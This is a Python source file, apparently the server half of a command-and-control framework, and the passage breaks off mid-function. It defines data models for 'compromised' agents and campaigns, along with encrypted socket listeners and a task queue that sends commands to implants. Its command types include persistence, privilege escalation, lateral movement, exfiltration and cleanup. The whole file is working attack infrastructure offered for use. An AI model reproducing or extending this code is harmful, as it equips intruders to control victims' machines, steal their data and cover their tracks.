import os
import sys
import json
import time
import random
import string
import hashlib
import logging
import argparse
import threading
import subprocess
import ipaddress
import socket
import struct
import base64
import zlib
import re
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, field, asdict
from enum import Enum
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# Try to import optional dependencies
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('c2_framework.log')
    ]
)
logger = logging.getLogger('C2Framework')

# ============================================================================
# Configuration and Constants
# ============================================================================

VERSION = "2.0.0"
CONFIG_FILE = "c2_config.json"
DEFAULT_PORT = 8080
DEFAULT_SSL_PORT = 8443
MAX_THREADS = 50
HEARTBEAT_INTERVAL = 30
SESSION_TIMEOUT = 300
MAX_RETRIES = 3
BUFFER_SIZE = 4096

# ============================================================================
# Data Models
# ============================================================================

class AgentStatus(Enum):
    OFFLINE = "offline"
    ONLINE = "online"
    BUSY = "busy"
    COMPROMISED = "compromised"
    UNKNOWN = "unknown"

class TaskStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"

class CommandType(Enum):
    SHELL = "shell"
    DOWNLOAD = "download"
    UPLOAD = "upload"
    EXECUTE = "execute"
    PERSISTENCE = "persistence"
    ESCALATE = "escalate"
    LATERAL = "lateral"
    EXFILTRATE = "exfiltrate"
    CLEANUP = "cleanup"
    HEARTBEAT = "heartbeat"
    CUSTOM = "custom"

@dataclass
class Agent:
    """Represents a compromised agent"""
    agent_id: str
    hostname: str
    ip_address: str
    os_info: str
    username: str
    status: AgentStatus = AgentStatus.OFFLINE
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    capabilities: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    notes: str = ""
    public_key: Optional[str] = None
    encryption_key: Optional[bytes] = None

@dataclass
class Task:
    """Represents a task assigned to an agent"""
    task_id: str
    agent_id: str
    command: CommandType
    parameters: Dict[str, Any]
    status: TaskStatus = TaskStatus.PENDING
    created_at: datetime = field(default_factory=datetime.now)
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    result: Optional[Any] = None
    error: Optional[str] = None
    priority: int = 0
    retry_count: int = 0

@dataclass
class Listener:
    """Represents a network listener"""
    listener_id: str
    host: str
    port: int
    ssl: bool = False
    cert_file: Optional[str] = None
    key_file: Optional[str] = None
    active: bool = False
    protocol: str = "tcp"
    bind_address: str = "0.0.0.0"

@dataclass
class Campaign:
    """Represents an operation campaign"""
    campaign_id: str
    name: str
    description: str
    created_at: datetime = field(default_factory=datetime.now)
    active: bool = True
    agents: List[str] = field(default_factory=list)
    tasks: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)

# ============================================================================
# Encryption and Security Module
# ============================================================================

class CryptoManager:
    """Manages encryption, decryption, and key operations"""
    
    def __init__(self):
        self.keys = {}
        self.active_key_id = None
        self._initialize_keys()
    
    def _initialize_keys(self):
        """Initialize encryption keys"""
        if CRYPTO_AVAILABLE:
            # Generate RSA key pair for asymmetric encryption
            self.private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=4096,
                backend=default_backend()
            )
            self.public_key = self.private_key.public_key()
            
            # Generate symmetric key for session encryption
            self.session_key = Fernet.generate_key()
            self.cipher = Fernet(self.session_key)
            
            # Store key ID
            self.active_key_id = hashlib.sha256(self.session_key).hexdigest()[:16]
            self.keys[self.active_key_id] = self.session_key
        else:
            logger.warning("Cryptography library not available. Using basic encryption.")
            self.session_key = os.urandom(32)
            self.active_key_id = hashlib.md5(self.session_key).hexdigest()[:16]
    
    def encrypt(self, data: Union[str, bytes]) -> bytes:
        """Encrypt data using active session key"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        if CRYPTO_AVAILABLE:
            return self.cipher.encrypt(data)
        else:
            # Basic XOR encryption as fallback
            key = self.session_key
            encrypted = bytearray()
            for i, byte in enumerate(data):
                encrypted.append(byte ^ key[i % len(key)])
            return bytes(encrypted)
    
    def decrypt(self, data: bytes) -> bytes:
        """Decrypt data using active session key"""
        if CRYPTO_AVAILABLE:
            return self.cipher.decrypt(data)
        else:
            # Basic XOR decryption as fallback
            key = self.session_key
            decrypted = bytearray()
            for i, byte in enumerate(data):
                decrypted.append(byte ^ key[i % len(key)])
            return bytes(decrypted)
    
    def encrypt_with_public_key(self, data: bytes) -> bytes:
        """Encrypt data with RSA public key"""
        if CRYPTO_AVAILABLE and hasattr(self, 'public_key'):
            return self.public_key.encrypt(
                data,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
        return data
    
    def sign_data(self, data: bytes) -> bytes:
        """Sign data with private key"""
        if CRYPTO_AVAILABLE and hasattr(self, 'private_key'):
            return self.private_key.sign(
                data,
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH
                ),
                hashes.SHA256()
            )
        return b''
    
    def verify_signature(self, data: bytes, signature: bytes, public_key) -> bool:
        """Verify data signature"""
        if CRYPTO_AVAILABLE:
            try:
                public_key.verify(
                    signature,
                    data,
                    padding.PSS(
                        mgf=padding.MGF1(hashes.SHA256()),
                        salt_length=padding.PSS.MAX_LENGTH
                    ),
                    hashes.SHA256()
                )
                return True
            except Exception:
                return False
        return True

# ============================================================================
# Network Module
# ============================================================================

class NetworkManager:
    """Manages network connections and listeners"""
    
    def __init__(self, crypto_manager: CryptoManager):
        self.crypto = crypto_manager
        self.listeners: Dict[str, Listener] = {}
        self.active_connections: Dict[str, socket.socket] = {}
        self.listener_threads: Dict[str, threading.Thread] = {}
        self.running = False
    
    def create_listener(self, host: str, port: int, ssl: bool = False,
                       cert_file: Optional[str] = None, key_file: Optional[str] = None) -> Listener:
        """Create a new listener configuration"""
        listener_id = self._generate_id()
        listener = Listener(
            listener_id=listener_id,
            host=host,
            port=port,
            ssl=ssl,
            cert_file=cert_file,
            key_file=key_file
        )
        self.listeners[listener_id] = listener
        return listener
    
    def start_listener(self, listener_id: str) -> bool:
        """Start a network listener"""
        if listener_id not in self.listeners:
            logger.error(f"Listener {listener_id} not found")
            return False
        
        listener = self.listeners[listener_id]
        if listener.active:
            logger.warning(f"Listener {listener_id} is already active")
            return False
        
        thread = threading.Thread(
            target=self._listener_worker,
            args=(listener,),
            daemon=True
        )
        self.listener_threads[listener_id] = thread
        thread.start()
        listener.active = True
        logger.info(f"Started listener on {listener.host}:{listener.port}")
        return True
    
    def stop_listener(self, listener_id: str) -> bool:
        """Stop a network listener"""
        if listener_id not in self.listeners:
            logger.error(f"Listener {listener_id} not found")
            return False
        
        listener = self.listeners[listener_id]
        listener.active = False
        
        if listener_id in self.listener_threads:
            # Thread will stop on next iteration
            pass
        
        logger.info(f"Stopped listener on {listener.host}:{listener.port}")
        return True
    
    def _listener_worker(self, listener: Listener):
        """Worker thread for handling incoming connections"""
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((listener.bind_address, listener.port))
            server_socket.listen(MAX_THREADS)
            server_socket.settimeout(1.0)  # Allow checking for stop signal
            
            while listener.active:
                try:
                    client_socket, address = server_socket.accept()
                    logger.info(f"New connection from {address[0]}:{address[1]}")
                    
                    # Handle connection in a new thread
                    thread = threading.Thread(
                        target=self._handle_connection,
                        args=(client_socket, address, listener),
                        daemon=True
                    )
                    thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if listener.active:
                        logger.error(f"Error accepting connection: {e}")
            
            server_socket.close()
            
        except Exception as e:
            logger.error(f"Listener error: {e}")
            listener.active = False
    
    def _handle_connection(self, client_socket: socket.socket, 
                          address: Tuple[str, int], listener: Listener):
        """Handle an incoming connection"""
        try:
            # Receive initial handshake
            data = client_socket.recv(BUFFER_SIZE)
            if not data:
                return
            
            # Decrypt and parse handshake
            decrypted = self.crypto.decrypt(data)
            handshake = json.loads(decrypted.decode('utf-8'))
            
            agent_id = handshake.get('agent_id')
            if agent_id:
                self.active_connections[agent_id] = client_socket
                logger.info(f"Agent {agent_id} connected from {address[0]}")
                
                # Send acknowledgment
                ack = self.crypto.encrypt(json.dumps({
                    'status': 'connected',
                    'timestamp': datetime.now().isoformat()
                }).encode('utf-8'))
                client_socket.send(ack)
            
        except Exception as e:
            logger.error(f"Error handling connection from {address}: {e}")
        finally:
            # Don't close socket here; keep alive for communication
            pass
    
    def send_command(self, agent_id: str, command: Dict) -> bool:
        """Send a command to an agent"""
        if agent_id not in self.active_connections:
            logger.error(f"Agent {agent_id} not connected")
            return False
        
        try:
            data = self.crypto.encrypt(json.dumps(command).encode('utf-8'))
            self.active_connections[agent_id].send(data)
            return True
        except Exception as e:
            logger.error(f"Error sending command to {agent_id}: {e}")
            return False
    
    def receive_response(self, agent_id: str, timeout: float = 30.0) -> Optional[Dict]:
        """Receive response from an agent"""
        if agent_id not in self.active_connections:
            logger.error(f"Agent {agent_id} not connected")
            return None
        
        try:
            self.active_connections[agent_id].settimeout(timeout)
            data = self.active_connections[agent_id].recv(BUFFER_SIZE)
            if data:
                decrypted = self.crypto.decrypt(data)
                return json.loads(decrypted.decode('utf-8'))
        except socket.timeout:
            logger.warning(f"Timeout waiting for response from {agent_id}")
        except Exception as e:
            logger.error(f"Error receiving response from {agent_id}: {e}")
        
        return None
    
    def _generate_id(self) -> str:
        """Generate a unique identifier"""
        return hashlib.md5(
            f"{time.time()}{random.random()}".encode()
        ).hexdigest()[:12]

# ============================================================================
# Agent Management Module
# ============================================================================

class AgentManager:
    """Manages agents and their lifecycle"""
    
    def __init__(self, crypto_manager: CryptoManager, network_manager: NetworkManager):
        self.crypto = crypto_manager
        self.network = network_manager
        self.agents: Dict[str, Agent] = {}
        self.tasks: Dict[str, Task] = {}
        self.campaigns: Dict[str, Campaign] = {}
        self.task_queue: deque = deque()
        self.lock = threading.Lock()
    
    def register_agent(self, hostname: str, ip_address: str, os_info: str,
                      username: str, capabilities: List[str] = None) -> Agent:
        """Register a new agent"""
        agent_id = self._generate_agent_id(hostname, ip_address)
        
        agent = Agent(
            agent_id=agent_id,
            hostname=hostname,
            ip_address=ip_address,
            os_info=os_info,
            username=username,
            status=AgentStatus.ONLINE,
            capabilities=capabilities or [],
            last_seen=datetime.now()
        )
        
        with self.lock:
            self.agents[agent_id] = agent
        
        logger.info(f"Registered new agent: {agent_id} ({hostname})")
        return agent
    
    def update_agent_status(self, agent_id: str, status: AgentStatus):
        """Update agent status"""
        with self.lock:
            if agent_id in self.agents:
                self.agents[agent_id].status = status
                self.agents[agent_id].last_seen = datetime.now()
    
    def get_agent(self, agent_id: str) -> Optional[Agent]:
        """Get agent by ID"""
        return self.agents.get(agent_id)
    
    def get_online_agents(self) -> List[Agent]:
        """Get all online agents"""
        return [a for a in self.agents.values() 
                if a.status == AgentStatus.ONLINE]
    
    def create_task(self, agent_id: str, command: CommandType,
                   parameters: Dict[str, Any], priority: int = 0) -> Optional[Task]:
        """Create a new task for an agent"""
        if agent_id not in self.agents:
            logger.error(f"Agent {agent_id} not found")
            return None
        
        task_id = self._generate_task_id()
        task = Task(
            task_id=task_id,
            agent_id=agent_id,
            command=command,
            parameters=parameters,
            priority=priority
        )
        
        with self.lock:
            self.tasks[task_id] = task
            self.task_queue.append(task_id)
        
        logger.info(f"Created task {task_id} for agent {agent_id}")
        return task
    
    def execute_task(self, task_id: str) -> bool:
        """Execute a task"""
        with self.lock:
            if task_id not in self.tasks:
                logger.error(f"Task {task_id} not found")
                return False
            
            task = self.tasks[task_id]
            task.status = TaskStatus.RUNNING
            task.started_at = datetime.now()
        
        # Send command to agent
        command = {
            'task_id': task.task_id,
            'command': task.command.value,
            'parameters': task.parameters
        }
        
        if self.network.send_command(task.agent_id, command):
            # Wait for response
            response = self.network.receive_response(task.agent_id)
            if response:
                with self.lock:
                    task.status = TaskStatus.COMPLETED
                    task.completed_at = datetime.now()
                    task.result = response.get('result')
                return True
            else:
                with self.lock:
                    task.status = TaskStatus.FAILED
                    task.error = "No response from agent"
                return